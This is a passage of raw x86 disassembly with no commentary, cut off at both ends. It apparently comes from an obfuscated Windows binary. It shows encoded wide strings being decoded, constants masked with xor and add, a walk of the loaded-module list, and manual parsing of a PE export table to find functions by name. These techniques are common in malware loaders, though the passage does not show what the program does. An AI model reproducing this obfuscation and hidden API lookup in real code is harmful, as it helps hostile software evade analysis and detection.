  4279a9:	lea    eax,[eax+esi*1+0x3272f1]
  4279b0:	mov    DWORD PTR [ebp-0x18],eax
  4279b3:	mov    eax,DWORD PTR [ebp-0x24]
  4279b6:	sub    eax,edx
  4279b8:	xor    eax,ecx
  4279ba:	mov    DWORD PTR [ebp-0x30],eax
  4279bd:	mov    eax,DWORD PTR [ebp-0x28]
  4279c0:	sub    eax,edx
  4279c2:	xor    eax,ecx
  4279c4:	mov    DWORD PTR [ebp-0x34],eax
  4279c7:	mov    eax,DWORD PTR [ebp-0x34]
  4279ca:	mov    esi,DWORD PTR [ebp-0x1c]
  4279cd:	xor    esi,ecx
  4279cf:	add    esi,edx
  4279d1:	xor    eax,ecx
  4279d3:	add    eax,0x3272f1
  4279d8:	imul   esi,eax
  4279db:	mov    eax,DWORD PTR [ebp-0x14]
  4279de:	movzx  eax,WORD PTR [esi+eax*1]
  4279e2:	mov    esi,DWORD PTR [ebp-0x30]
  4279e5:	mov    edi,DWORD PTR [ebp-0x1c]
  4279e8:	xor    esi,ecx
  4279ea:	add    esi,edx
  4279ec:	xor    edi,ecx
  4279ee:	add    edi,edx
  4279f0:	imul   edi,esi
  4279f3:	mov    esi,DWORD PTR [ebp-0x10]
  4279f6:	movzx  esi,WORD PTR [edi+esi*1]
  4279fa:	sub    eax,edx
  4279fc:	sub    esi,edx
  4279fe:	xor    eax,ecx
  427a00:	xor    esi,ecx
  427a02:	cmp    esi,eax
  427a04:	jne    0x427a2f
  427a06:	mov    eax,DWORD PTR [ebp-0x30]
  427a09:	mov    esi,DWORD PTR [ebp-0x1c]
  427a0c:	xor    eax,ecx
  427a0e:	add    eax,0x3272f1
  427a13:	xor    esi,ecx
  427a15:	add    esi,edx
  427a17:	imul   esi,eax
  427a1a:	mov    eax,DWORD PTR [ebp-0x10]
  427a1d:	movzx  eax,WORD PTR [esi+eax*1]
  427a21:	mov    esi,DWORD PTR [ebp-0xc]
  427a24:	sub    eax,edx
  427a26:	xor    eax,ecx
  427a28:	cmp    eax,esi
  427a2a:	mov    eax,DWORD PTR [ebp-0xc]
  427a2d:	je     0x427a32
  427a2f:	mov    eax,DWORD PTR [ebp-0x18]
  427a32:	pop    edi
  427a33:	xor    eax,ecx
  427a35:	pop    esi
  427a36:	add    eax,edx
  427a38:	pop    ebx
  427a39:	leave  
  427a3a:	ret    0x8
  427a3d:	push   ebp
  427a3e:	mov    ebp,esp
  427a40:	push   ecx
  427a41:	mov    cx,WORD PTR [eax]
  427a44:	push   esi
  427a45:	mov    esi,0x3b5a
  427a4a:	sub    cx,si
  427a4d:	mov    esi,0x8a98
  427a52:	xor    cx,si
  427a55:	mov    esi,0x4e3e
  427a5a:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  427a61:	mov    edx,0xf89c85a5
  427a66:	cmp    cx,si
  427a69:	je     0x427ac8
  427a6b:	push   ebx
  427a6c:	push   edi
  427a6d:	movzx  ecx,cx
  427a70:	mov    edi,0xffcd8d0f
  427a75:	mov    esi,0x75108aa
  427a7a:	mov    ebx,0x4f9a
  427a7f:	cmp    cx,bx
  427a82:	jne    0x427a87
  427a84:	mov    DWORD PTR [ebp-0x4],edx
  427a87:	lea    edx,[edi+0x1]
  427a8a:	xor    edx,esi
  427a8c:	mov    edi,edx
  427a8e:	xor    edi,esi
  427a90:	mov    cx,WORD PTR [eax+edi*2+0x64e5e2]
  427a98:	mov    ebx,0x3b5a
  427a9d:	sub    cx,bx
  427aa0:	mov    ebx,0x8a98
  427aa5:	xor    cx,bx
  427aa8:	mov    ebx,0x4e3e
  427aad:	cmp    cx,bx
  427ab0:	jne    0x427a7a
  427ab2:	mov    ecx,DWORD PTR [ebp-0x4]
  427ab5:	pop    edi
  427ab6:	pop    ebx
  427ab7:	cmp    ecx,0xf89c85a4
  427abd:	je     0x427ac8
  427abf:	xor    ecx,esi
  427ac1:	lea    eax,[eax+ecx*2+0x64e5e4]
  427ac8:	pop    esi
  427ac9:	leave  
  427aca:	ret    
  427acb:	push   ebp
  427acc:	mov    ebp,esp
  427ace:	push   ecx
  427acf:	push   esi
  427ad0:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  427ad7:	mov    esi,0xf89c85a5
  427adc:	call   0x427a3d
  427ae1:	mov    cl,BYTE PTR [eax]
  427ae3:	dec    cl
  427ae5:	xor    cl,0x7c
  427ae8:	cmp    cl,0x83
  427aeb:	je     0x427b50
  427aed:	push   ebx
  427aee:	push   edi
  427aef:	mov    edx,eax
  427af1:	mov    edi,0xffcd8d0f
  427af6:	mov    ecx,0x75108aa
  427afb:	mov    dx,WORD PTR [edx]
  427afe:	mov    ebx,0x3b5a
  427b03:	sub    dx,bx
  427b06:	mov    ebx,0x8a98
  427b0b:	xor    dx,bx
  427b0e:	mov    ebx,0x4e4c
  427b13:	cmp    dx,bx
  427b16:	jne    0x427b1b
  427b18:	mov    DWORD PTR [ebp-0x4],esi
  427b1b:	lea    esi,[edi+0x1]
  427b1e:	xor    esi,ecx
  427b20:	mov    edi,esi
  427b22:	xor    edi,ecx
  427b24:	lea    edx,[eax+edi*2+0x64e5e2]
  427b2b:	mov    bl,BYTE PTR [edx]
  427b2d:	dec    bl
  427b2f:	xor    bl,0x7c
  427b32:	cmp    bl,0x83
  427b35:	jne    0x427afb
  427b37:	mov    edx,DWORD PTR [ebp-0x4]
  427b3a:	pop    edi
  427b3b:	pop    ebx
  427b3c:	cmp    edx,0xf89c85a4
  427b42:	je     0x427b50
  427b44:	xor    edx,ecx
  427b46:	xor    ecx,ecx
  427b48:	mov    WORD PTR [eax+edx*2+0x64e5e2],cx
  427b50:	pop    esi
  427b51:	leave  
  427b52:	ret    
  427b53:	push   ebp
  427b54:	mov    ebp,esp
  427b56:	push   ecx
  427b57:	push   esi
  427b58:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  427b5f:	mov    esi,0xf89c85a5
  427b64:	call   0x427a3d
  427b69:	mov    cx,WORD PTR [eax]
  427b6c:	mov    edx,0x3b5a
  427b71:	sub    cx,dx
  427b74:	mov    edx,0x8a98
  427b79:	xor    cx,dx
  427b7c:	mov    edx,0x4e3e
  427b81:	cmp    cx,dx
  427b84:	je     0x427bdd
  427b86:	push   ebx
  427b87:	push   edi
  427b88:	movzx  ecx,cx
  427b8b:	mov    edx,0xffcd8d0f
  427b90:	mov    edi,0x75108aa
  427b95:	mov    ebx,0x4e4c
  427b9a:	cmp    cx,bx
  427b9d:	jne    0x427ba2
  427b9f:	mov    DWORD PTR [ebp-0x4],esi
  427ba2:	lea    esi,[edx+0x1]
  427ba5:	xor    esi,edi
  427ba7:	mov    edx,esi
  427ba9:	xor    edx,edi
  427bab:	mov    cx,WORD PTR [eax+edx*2+0x64e5e2]
  427bb3:	mov    ebx,0x3b5a
  427bb8:	sub    cx,bx
  427bbb:	mov    ebx,0x8a98
  427bc0:	xor    cx,bx
  427bc3:	mov    ebx,0x4e3e
  427bc8:	cmp    cx,bx
  427bcb:	jne    0x427b95
  427bcd:	cmp    DWORD PTR [ebp-0x4],0xf89c85a4
  427bd4:	pop    edi
  427bd5:	pop    ebx
  427bd6:	je     0x427bdd
  427bd8:	xor    eax,eax
  427bda:	inc    eax
  427bdb:	jmp    0x427bdf
  427bdd:	xor    eax,eax
  427bdf:	pop    esi
  427be0:	leave  
  427be1:	ret    
  427be2:	push   ebp
  427be3:	mov    ebp,esp
  427be5:	push   ecx
  427be6:	mov    eax,DWORD PTR [ebp+0x8]
  427be9:	movzx  ecx,WORD PTR [eax]
  427bec:	push   esi
  427bed:	lea    eax,[ecx-0x3b5a]
  427bf3:	mov    esi,0x8a98
  427bf8:	push   edi
  427bf9:	xor    eax,esi
  427bfb:	mov    edi,0x4e3e
  427c00:	mov    DWORD PTR [ebp-0x4],edx
  427c03:	cmp    ax,di
  427c06:	je     0x427c33
  427c08:	mov    eax,DWORD PTR [ebp+0x8]
  427c0b:	sub    eax,edx
  427c0d:	mov    DWORD PTR [ebp+0x8],eax
  427c10:	jmp    0x427c15
  427c12:	mov    eax,DWORD PTR [ebp+0x8]
  427c15:	mov    WORD PTR [edx],cx
  427c18:	add    edx,0x2
  427c1b:	movzx  edi,WORD PTR [eax+edx*1]
  427c1f:	mov    ecx,edi
  427c21:	add    edi,0xffffc4a6
  427c27:	xor    edi,esi
  427c29:	mov    eax,0x4e3e
  427c2e:	cmp    di,ax
  427c31:	jne    0x427c12
  427c33:	xor    eax,eax
  427c35:	pop    edi
  427c36:	mov    WORD PTR [edx],ax
  427c39:	mov    eax,DWORD PTR [ebp-0x4]
  427c3c:	pop    esi
  427c3d:	leave  
  427c3e:	ret    0x4
  427c41:	push   ebp
  427c42:	mov    ebp,esp
  427c44:	sub    esp,0x18
  427c47:	mov    DWORD PTR [ebp-0x8],0xf89c85a5
  427c4e:	mov    DWORD PTR [ebp-0x18],0xf89c85ba
  427c55:	mov    ecx,DWORD PTR [ebp-0x8]
  427c58:	push   esi
  427c59:	mov    eax,0x75108aa
  427c5e:	xor    ecx,eax
  427c60:	mov    esi,0x3272f1
  427c65:	add    ecx,esi
  427c67:	mov    DWORD PTR [ebp-0x4],ecx
  427c6a:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  427c71:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  427c78:	push   edi
  427c79:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  427c80:	jmp    0x427d21
  427c85:	mov    ecx,DWORD PTR [ebp-0x4]
  427c88:	mov    edx,DWORD PTR [ebp+0x10]
  427c8b:	sub    edx,ecx
  427c8d:	mov    ecx,DWORD PTR [ebp-0xc]
  427c90:	xor    ecx,eax
  427c92:	add    ecx,esi
  427c94:	cmp    edx,ecx
  427c96:	jbe    0x427cb3
  427c98:	mov    edx,DWORD PTR [ebp-0x4]
  427c9b:	add    edx,DWORD PTR [ebp+0x8]
  427c9e:	mov    ecx,DWORD PTR [ebp-0x4]
  427ca1:	add    ecx,DWORD PTR [ebp+0xc]
  427ca4:	mov    edi,DWORD PTR [ecx]
  427ca6:	mov    DWORD PTR [edx],edi
  427ca8:	mov    ecx,DWORD PTR [ecx+0x4]
  427cab:	mov    DWORD PTR [edx+0x4],ecx
  427cae:	mov    ecx,DWORD PTR [ebp-0xc]
  427cb1:	jmp    0x427d00
  427cb3:	mov    ecx,DWORD PTR [ebp-0x4]
  427cb6:	mov    edx,DWORD PTR [ebp+0x10]
  427cb9:	sub    edx,ecx
  427cbb:	mov    ecx,DWORD PTR [ebp-0x10]
  427cbe:	xor    ecx,eax
  427cc0:	add    ecx,esi
  427cc2:	cmp    edx,ecx
  427cc4:	mov    ecx,DWORD PTR [ebp-0x4]
  427cc7:	jbe    0x427cdb
  427cc9:	add    ecx,DWORD PTR [ebp+0x8]
  427ccc:	mov    edx,DWORD PTR [ebp-0x4]
  427ccf:	add    edx,DWORD PTR [ebp+0xc]
  427cd2:	mov    edx,DWORD PTR [edx]
  427cd4:	mov    DWORD PTR [ecx],edx
  427cd6:	mov    ecx,DWORD PTR [ebp-0x10]
  427cd9:	jmp    0x427d00
  427cdb:	mov    edx,DWORD PTR [ebp+0x10]
  427cde:	sub    edx,ecx
  427ce0:	mov    ecx,DWORD PTR [ebp-0x14]
  427ce3:	xor    ecx,eax
  427ce5:	add    ecx,esi
  427ce7:	cmp    edx,ecx
  427ce9:	mov    ecx,DWORD PTR [ebp-0x4]
  427cec:	jbe    0x427d11
  427cee:	add    ecx,DWORD PTR [ebp+0x8]
  427cf1:	mov    edx,DWORD PTR [ebp-0x4]
  427cf4:	add    edx,DWORD PTR [ebp+0xc]
  427cf7:	mov    dx,WORD PTR [edx]
  427cfa:	mov    WORD PTR [ecx],dx
  427cfd:	mov    ecx,DWORD PTR [ebp-0x14]
  427d00:	mov    edx,DWORD PTR [ebp-0x4]
  427d03:	xor    ecx,eax
  427d05:	lea    ecx,[ecx+edx*1+0x3272f1]
  427d0c:	mov    DWORD PTR [ebp-0x4],ecx
  427d0f:	jmp    0x427d21
  427d11:	add    ecx,DWORD PTR [ebp+0x8]
  427d14:	mov    edx,DWORD PTR [ebp-0x4]
  427d17:	add    edx,DWORD PTR [ebp+0xc]
  427d1a:	mov    dl,BYTE PTR [edx]
  427d1c:	mov    BYTE PTR [ecx],dl
  427d1e:	inc    DWORD PTR [ebp-0x4]
  427d21:	mov    ecx,DWORD PTR [ebp-0x18]
  427d24:	mov    edx,DWORD PTR [ebp+0x10]
  427d27:	xor    ecx,eax
  427d29:	add    ecx,esi
  427d2b:	imul   ecx,edx
  427d2e:	mov    edx,DWORD PTR [ebp-0x8]
  427d31:	mov    edi,DWORD PTR [ebp-0x4]
  427d34:	xor    edx,eax
  427d36:	lea    edx,[edx+edi*1+0x3272f1]
  427d3d:	cmp    edx,ecx
  427d3f:	jb     0x427c85
  427d45:	pop    edi
  427d46:	pop    esi
  427d47:	leave  
  427d48:	ret    0xc
  427d4b:	push   ebp
  427d4c:	mov    ebp,esp
  427d4e:	sub    esp,0xc
  427d51:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  427d58:	push   esi
  427d59:	mov    esi,eax
  427d5b:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  427d62:	mov    edx,DWORD PTR [ebp-0x4]
  427d65:	mov    eax,0x75108aa
  427d6a:	xor    edx,eax
  427d6c:	mov    ecx,0x3272f1
  427d71:	add    edx,ecx
  427d73:	cmp    esi,edx
  427d75:	je     0x427db7
  427d77:	push   ebx
  427d78:	push   edi
  427d79:	mov    edx,DWORD PTR [ebp-0x8]
  427d7c:	mov    ebx,DWORD PTR [ebp+0x8]
  427d7f:	xor    edx,eax
  427d81:	mov    edi,0xffcd8d0f
  427d86:	sub    edi,edx
  427d88:	add    esi,edi
  427d8a:	lea    edx,[esi-0x3272f1]
  427d90:	xor    edx,eax
  427d92:	mov    DWORD PTR [ebp-0xc],edx
  427d95:	mov    edx,DWORD PTR [ebp-0x4]
  427d98:	mov    edi,DWORD PTR [ebp-0xc]
  427d9b:	xor    dl,0xaa
  427d9e:	sub    dl,0xf
  427da1:	xor    edi,eax
  427da3:	mov    BYTE PTR [edi+ebx*1+0x3272f1],dl
  427daa:	mov    edx,DWORD PTR [ebp-0x4]
  427dad:	xor    edx,eax
  427daf:	add    edx,ecx
  427db1:	cmp    esi,edx
  427db3:	jne    0x427d79
  427db5:	pop    edi
  427db6:	pop    ebx
  427db7:	pop    esi
  427db8:	leave  
  427db9:	ret    0x4
  427dbc:	push   ebp
  427dbd:	mov    ebp,esp
  427dbf:	sub    esp,0x21c
  427dc5:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  427dcc:	mov    DWORD PTR [ebp-0x14],0xf89c85ba
  427dd3:	mov    eax,DWORD PTR [ebp+0x10]
  427dd6:	mov    eax,DWORD PTR [ebp-0x4]
  427dd9:	mov    ecx,DWORD PTR [ebp+0x8]
  427ddc:	push   esi
  427ddd:	push   edi
  427dde:	mov    edi,0x75108aa
  427de3:	xor    eax,edi
  427de5:	mov    esi,0x3272f1
  427dea:	add    eax,esi
  427dec:	cmp    eax,ecx
  427dee:	mov    eax,DWORD PTR [ebp-0x4]
  427df1:	jne    0x427dfc
  427df3:	xor    eax,edi
  427df5:	add    eax,esi
  427df7:	jmp    0x427ea8
  427dfc:	mov    ecx,DWORD PTR [ebp+0xc]
  427dff:	xor    eax,edi
  427e01:	add    eax,esi
  427e03:	cmp    eax,ecx
  427e05:	jne    0x427e0c
  427e07:	mov    eax,DWORD PTR [ebp-0x4]
  427e0a:	jmp    0x427df3
  427e0c:	lea    eax,[ebp-0x21c]
  427e12:	mov    DWORD PTR [ebp-0x8],eax
  427e15:	mov    eax,DWORD PTR [ebp+0xc]
  427e18:	mov    DWORD PTR [ebp-0x10],eax
  427e1b:	mov    eax,DWORD PTR [ebp-0x4]
  427e1e:	xor    eax,edi
  427e20:	add    eax,esi
  427e22:	mov    DWORD PTR [ebp+0x10],eax
  427e25:	mov    eax,DWORD PTR [ebp+0xc]
  427e28:	push   ebx
  427e29:	call   0x427b53
  427e2e:	mov    ebx,eax
  427e30:	mov    eax,DWORD PTR [ebp+0x8]
  427e33:	mov    eax,DWORD PTR [eax+0x14]
  427e36:	jmp    0x427e90
  427e38:	mov    eax,DWORD PTR [ebp+0xc]
  427e3b:	sub    eax,0x8
  427e3e:	mov    DWORD PTR [ebp-0xc],eax
  427e41:	mov    eax,DWORD PTR [ebp-0xc]
  427e44:	mov    eax,DWORD PTR [eax+0x28]
  427e47:	call   0x427a3d
  427e4c:	mov    DWORD PTR [ebp+0x10],eax
  427e4f:	push   DWORD PTR [ebp+0x10]
  427e52:	mov    edx,DWORD PTR [ebp-0x8]
  427e55:	call   0x427be2
  427e5a:	mov    eax,DWORD PTR [ebp-0x4]
  427e5d:	xor    eax,edi
  427e5f:	add    eax,esi
  427e61:	cmp    eax,ebx
  427e63:	jne    0x427e6d
  427e65:	mov    eax,DWORD PTR [ebp-0x8]
  427e68:	call   0x427acb
  427e6d:	mov    eax,DWORD PTR [ebp-0x14]
  427e70:	xor    eax,edi
  427e72:	add    eax,esi
  427e74:	push   eax
  427e75:	push   DWORD PTR [ebp-0x10]
  427e78:	mov    eax,DWORD PTR [ebp-0x8]
  427e7b:	call   0x4277f7
  427e80:	mov    ecx,DWORD PTR [ebp-0x4]
  427e83:	xor    ecx,edi
  427e85:	add    ecx,esi
  427e87:	cmp    eax,ecx
  427e89:	je     0x427eae
  427e8b:	mov    eax,DWORD PTR [ebp+0xc]
  427e8e:	mov    eax,DWORD PTR [eax]
  427e90:	mov    DWORD PTR [ebp+0xc],eax
  427e93:	mov    eax,DWORD PTR [ebp+0x8]
  427e96:	mov    ecx,DWORD PTR [ebp+0xc]
  427e99:	add    eax,0x14
  427e9c:	cmp    ecx,eax
  427e9e:	jne    0x427e38
  427ea0:	mov    eax,DWORD PTR [ebp-0x4]
  427ea3:	xor    eax,edi
  427ea5:	add    eax,esi
  427ea7:	pop    ebx
  427ea8:	pop    edi
  427ea9:	pop    esi
  427eaa:	leave  
  427eab:	ret    0xc
  427eae:	mov    eax,DWORD PTR [ebp-0xc]
  427eb1:	mov    eax,DWORD PTR [eax+0x18]
  427eb4:	jmp    0x427ea7
  427eb6:	push   ebp
  427eb7:	mov    ebp,esp
  427eb9:	mov    eax,DWORD PTR [ebp+0xc]
  427ebc:	sub    esp,0x10
  427ebf:	cmp    DWORD PTR [ebp+0x8],0x0
  427ec3:	push   ebx
  427ec4:	push   esi
  427ec5:	push   edi
  427ec6:	je     0x427f7b
  427ecc:	test   eax,eax
  427ece:	je     0x427f7b
  427ed4:	movzx  eax,WORD PTR [eax+0x20]
  427ed8:	mov    ecx,eax
  427eda:	mov    DWORD PTR [ebp-0x10],eax
  427edd:	xor    edx,edx
  427edf:	and    DWORD PTR [ebp-0x8],edx
  427ee2:	mov    eax,0x8a98
  427ee7:	xor    ecx,eax
  427ee9:	add    ecx,0x3b5a
  427eef:	mov    DWORD PTR [ebp-0xc],ecx
  427ef2:	and    DWORD PTR [ebp-0x4],0x0
  427ef6:	xor    ecx,ecx
  427ef8:	push   0x7d
  427efa:	pop    edi
  427efb:	cmp    cx,WORD PTR [ebp-0xc]
  427eff:	jae    0x427f65
  427f01:	lea    esi,[edx-0x3b5a]
  427f07:	xor    esi,eax
  427f09:	movzx  ecx,WORD PTR [ebp-0x4]
  427f0d:	mov    ebx,DWORD PTR [ebp+0xc]
  427f10:	lea    ecx,[ebx+ecx*4]
  427f13:	cmp    WORD PTR [ecx+0x2],si
  427f17:	jne    0x427f50
  427f19:	movzx  ecx,WORD PTR [ecx]
  427f1c:	mov    edi,0x4e3e
  427f21:	cmp    cx,di
  427f24:	jne    0x427f32
  427f26:	mov    ebx,DWORD PTR [ebp+0x8]
  427f29:	movzx  edi,dx
  427f2c:	cmp    BYTE PTR [edi+ebx*1],0x0
  427f30:	je     0x427f5f
  427f32:	mov    ebx,DWORD PTR [ebp+0x8]
  427f35:	movzx  edi,dx
  427f38:	movsx  di,BYTE PTR [edi+ebx*1]
  427f3d:	mov    ebx,0x3b5a
  427f42:	sub    di,bx
  427f45:	xor    di,ax
  427f48:	cmp    cx,di
  427f4b:	je     0x427f5f
  427f4d:	push   0xffffff83
  427f4f:	pop    edi
  427f50:	inc    DWORD PTR [ebp-0x4]
  427f53:	mov    cx,WORD PTR [ebp-0xc]
  427f57:	cmp    WORD PTR [ebp-0x4],cx
  427f5b:	jb     0x427f09
  427f5d:	jmp    0x427f65
  427f5f:	inc    DWORD PTR [ebp-0x8]
  427f62:	push   0x7c
  427f64:	pop    edi
  427f65:	mov    esi,DWORD PTR [ebp+0x8]
  427f68:	movzx  ecx,dx
  427f6b:	cmp    BYTE PTR [ecx+esi*1],0x0
  427f6f:	je     0x427f84
  427f71:	inc    edx
  427f72:	cmp    edi,0xffffff83
  427f75:	jne    0x427ef2
  427f7b:	xor    eax,eax
  427f7d:	pop    edi
  427f7e:	pop    esi
  427f7f:	pop    ebx
  427f80:	leave  
  427f81:	ret    0x8
  427f84:	mov    ecx,DWORD PTR [ebp-0x8]
  427f87:	add    ecx,0xffffc4a6
  427f8d:	xor    cx,ax
  427f90:	xor    eax,eax
  427f92:	cmp    cx,WORD PTR [ebp-0x10]
  427f96:	sete   al
  427f99:	jmp    0x427f7d
  427f9b:	push   ebp
  427f9c:	mov    ebp,esp
  427f9e:	sub    esp,0x50
  427fa1:	push   edi
  427fa2:	mov    edi,eax
  427fa4:	mov    eax,DWORD PTR [edi+0x1a8]
  427faa:	cmp    DWORD PTR [eax],0x0
  427fad:	jne    0x427fb6
  427faf:	xor    eax,eax
  427fb1:	jmp    0x4280e7
  427fb6:	push   DWORD PTR [ebp+0x8]
  427fb9:	push   0x2c
  427fbb:	pop    eax
  427fbc:	call   0x427d4b
  427fc1:	mov    edx,DWORD PTR [edi+0x1ac]
  427fc7:	lea    eax,[edi+0x22]
  427fca:	mov    DWORD PTR [ebp-0x4c],eax
  427fcd:	lea    eax,[edi+0x44]
  427fd0:	mov    DWORD PTR [ebp-0x48],eax
  427fd3:	lea    eax,[edi+0x66]
  427fd6:	mov    DWORD PTR [ebp-0x44],eax
  427fd9:	lea    eax,[edi+0x88]
  427fdf:	mov    DWORD PTR [ebp-0x40],eax
  427fe2:	lea    eax,[edi+0xaa]
  427fe8:	mov    DWORD PTR [ebp-0x3c],eax
  427feb:	lea    eax,[edi+0xcc]
  427ff1:	mov    DWORD PTR [ebp-0x38],eax
  427ff4:	lea    eax,[edi+0xee]
  427ffa:	mov    DWORD PTR [ebp-0x34],eax
  427ffd:	lea    eax,[edi+0x110]
  428003:	mov    DWORD PTR [ebp-0x30],eax
  428006:	lea    eax,[edi+0x132]
  42800c:	mov    DWORD PTR [ebp-0x2c],eax
  42800f:	lea    eax,[edi+0x154]
  428015:	push   edi
  428016:	mov    DWORD PTR [ebp-0x50],edi
  428019:	mov    DWORD PTR [ebp-0x28],eax
  42801c:	call   0x42811b
  428021:	push   eax
  428022:	mov    eax,DWORD PTR [edi+0x1a8]
  428028:	push   DWORD PTR [eax]
  42802a:	call   0x427dbc
  42802f:	mov    DWORD PTR [ebp-0x10],eax
  428032:	test   eax,eax
  428034:	je     0x4280e7
  42803a:	mov    ecx,DWORD PTR [eax+0x3c]
  42803d:	push   ebx
  42803e:	push   esi
  42803f:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  428043:	add    esi,eax
  428045:	mov    edi,DWORD PTR [esi+0x24]
  428048:	mov    ecx,DWORD PTR [esi+0x1c]
  42804b:	mov    edx,DWORD PTR [esi+0x20]
  42804e:	mov    ebx,DWORD PTR [esi+0x18]
  428051:	add    edi,eax
  428053:	mov    DWORD PTR [ebp-0x20],edi
  428056:	mov    edi,DWORD PTR [esi+0x14]
  428059:	add    ecx,eax
  42805b:	add    edx,eax
  42805d:	mov    DWORD PTR [ebp-0xc],ecx
  428060:	mov    DWORD PTR [ebp-0x1c],edx
  428063:	mov    DWORD PTR [ebp-0x8],edi
  428066:	cmp    edi,ebx
  428068:	ja     0x42806d
  42806a:	mov    DWORD PTR [ebp-0x8],ebx
  42806d:	xor    ebx,ebx
  42806f:	mov    DWORD PTR [ebp-0x18],ebx
  428072:	cmp    DWORD PTR [ebp-0x8],ebx
  428075:	jbe    0x4280e5
  428077:	jmp    0x42807c
  428079:	mov    edx,DWORD PTR [ebp-0x1c]
  42807c:	mov    edi,DWORD PTR [ebp-0x20]
  42807f:	movzx  edi,WORD PTR [edi+ebx*2]
  428083:	cmp    ebx,DWORD PTR [esi+0x18]
  428086:	jae    0x4280e5
  428088:	cmp    edi,DWORD PTR [esi+0x14]
  42808b:	jae    0x4280e5
  42808d:	mov    ebx,DWORD PTR [edx+ebx*4]
  428090:	mov    edx,DWORD PTR [ebp+0x8]
  428093:	mov    edi,DWORD PTR [ecx+edi*4]
  428096:	mov    DWORD PTR [ebp-0x4],edx
  428099:	lea    edx,[ebp-0x50]
  42809c:	add    ebx,eax
  42809e:	add    edi,eax
  4280a0:	sub    edx,DWORD PTR [ebp+0x8]
  4280a3:	mov    DWORD PTR [ebp-0x14],0xb
  4280aa:	mov    DWORD PTR [ebp-0x24],edx
  4280ad:	mov    edx,DWORD PTR [ebp-0x4]
  4280b0:	cmp    DWORD PTR [edx],0x0
  4280b3:	jne    0x4280d0
  4280b5:	mov    eax,DWORD PTR [ebp-0x24]
  4280b8:	push   DWORD PTR [eax+edx*1]
  4280bb:	push   ebx
  4280bc:	call   0x427eb6
  4280c1:	mov    ecx,DWORD PTR [ebp-0xc]
  4280c4:	test   eax,eax
  4280c6:	je     0x4280cd
  4280c8:	mov    eax,DWORD PTR [ebp-0x4]
  4280cb:	mov    DWORD PTR [eax],edi
  4280cd:	mov    eax,DWORD PTR [ebp-0x10]
  4280d0:	add    DWORD PTR [ebp-0x4],0x4
  4280d4:	dec    DWORD PTR [ebp-0x14]
  4280d7:	jne    0x4280ad
  4280d9:	mov    ebx,DWORD PTR [ebp-0x18]
  4280dc:	inc    ebx
  4280dd:	mov    DWORD PTR [ebp-0x18],ebx
  4280e0:	cmp    ebx,DWORD PTR [ebp-0x8]
  4280e3:	jb     0x428079
  4280e5:	pop    esi
  4280e6:	pop    ebx
  4280e7:	pop    edi
  4280e8:	leave  
  4280e9:	ret    0x4
  4280ec:	push   ebp
  4280ed:	mov    ebp,esp
  4280ef:	mov    eax,DWORD PTR [ebp+0x8]
  4280f2:	push   esi
  4280f3:	push   DWORD PTR [eax+0x1e0]
  4280f9:	lea    esi,[eax+0x198]
  4280ff:	mov    eax,DWORD PTR [ebp+0x8]
  428102:	call   0x427f9b
  428107:	mov    ecx,DWORD PTR [esi]
  428109:	mov    DWORD PTR [ecx],eax
  42810b:	mov    eax,DWORD PTR [esi]
  42810d:	xor    ecx,ecx
  42810f:	cmp    DWORD PTR [eax],ecx
  428111:	pop    esi
  428112:	setne  cl
  428115:	mov    eax,ecx
  428117:	pop    ebp
  428118:	ret    0x4
  42811b:	mov    ecx,DWORD PTR [edi+0x188]
  428121:	push   ebx
  428122:	jmp    0x428137
  428124:	xor    eax,0x8a98
  428129:	add    eax,0x3b5a
  42812e:	mov    WORD PTR [ecx],ax
  428131:	add    ecx,0x2
  428134:	add    edx,0x2
  428137:	movzx  eax,WORD PTR [edx]
  42813a:	mov    ebx,0x4e3e
  42813f:	cmp    ax,bx
  428142:	jne    0x428124
  428144:	xor    eax,eax
  428146:	mov    WORD PTR [ecx],ax
  428149:	mov    eax,DWORD PTR [edi+0x188]
  42814f:	pop    ebx
  428150:	ret    
  428151:	push   edi
  428152:	mov    edi,eax
  428154:	mov    eax,DWORD PTR [esi+0x188]
  42815a:	shl    edi,0x6
  42815d:	add    eax,edi
  42815f:	jmp    0x42816a
  428161:	xor    cl,0x7c
  428164:	inc    cl
  428166:	mov    BYTE PTR [eax],cl
  428168:	inc    eax
  428169:	inc    edx
  42816a:	mov    cl,BYTE PTR [edx]
  42816c:	cmp    cl,0x83
  42816f:	jne    0x428161
  428171:	mov    BYTE PTR [eax],0x0
  428174:	mov    eax,DWORD PTR [esi+0x188]
  42817a:	add    eax,edi
  42817c:	pop    edi
  42817d:	ret    
  42817e:	push   ebp
  42817f:	mov    ebp,esp
  428181:	sub    esp,0x14
  428184:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  42818b:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  428192:	mov    eax,DWORD PTR [ebx]
  428194:	mov    DWORD PTR [ebp-0x8],eax
  428197:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42819e:	push   esi
  42819f:	push   edi
  4281a0:	mov    DWORD PTR [ebp-0x14],0xead71885
  4281a7:	mov    edi,DWORD PTR [ebp-0x4]
  4281aa:	mov    ecx,DWORD PTR [ebp-0x10]
  4281ad:	mov    eax,0x75108aa
  4281b2:	xor    edi,eax
  4281b4:	mov    edx,0x3272f1
  4281b9:	xor    ecx,eax
  4281bb:	add    edi,edx
  4281bd:	add    ecx,edx
  4281bf:	imul   edi,ecx
  4281c2:	jmp    0x42820a
  4281c4:	mov    ecx,DWORD PTR [ebp-0x8]
  4281c7:	mov    esi,DWORD PTR [ebp-0x4]
  4281ca:	xor    ecx,eax
  4281cc:	xor    esi,eax
  4281ce:	add    ecx,edx
  4281d0:	add    esi,edx
  4281d2:	test   esi,ecx
  4281d4:	mov    esi,DWORD PTR [ebp-0x8]
  4281d7:	mov    ecx,DWORD PTR [ebp-0x4]
  4281da:	je     0x4281f1
  4281dc:	xor    ecx,eax
  4281de:	xor    esi,eax
  4281e0:	add    ecx,edx
  4281e2:	add    esi,edx
  4281e4:	shr    esi,cl
  4281e6:	mov    ecx,DWORD PTR [ebp-0x14]
  4281e9:	xor    ecx,eax
  4281eb:	add    ecx,edx
